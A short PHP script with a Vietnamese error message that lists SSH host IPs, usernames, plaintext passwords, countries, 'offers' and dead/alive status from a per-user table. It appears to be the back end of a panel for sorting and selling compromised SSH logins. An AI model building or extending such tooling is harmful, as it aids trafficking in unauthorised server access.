<?php
If(!isset($_SESSION['user_id'])){
	exit("User id không tô`n ta.i");
}
$user_id = $_SESSION["user_id"];
$type = 'all';
If(isset($_GET['type'])){
	$type=mysql_real_escape_string($_GET['type']);
	$value = mysql_real_escape_string($_GET['value']);
	If($type=='country'){
		$condition = "country = '$value'";
	}else{
		If($value=='None')
			$condition = "offers=''";
		else
			$condition = "offers like '%$value,%'";
	}
	$res = mysql_query("select * from sshs_".$user_id." where $condition order by ip");
	If(mysql_num_rows($res)>0){
		echo "<table border='1'>";
		echo "<tr><th>IP<th>USER</th><th>PASSWORD</th><th>COUNTRY</th><th>OFFERS</th><th>STATUS</th></tr>";
		while($r = mysql_fetch_assoc($res)){
			echo "<tr><td>".$r['ip']."</td><td>".$r['user']."</td><td>".$r['passwd']."</td><td>".$r['country']."</td><td>".$r['offers']."</td><td>".$r['dead']."</td></tr>";
		}
		echo "</table>";
	}
}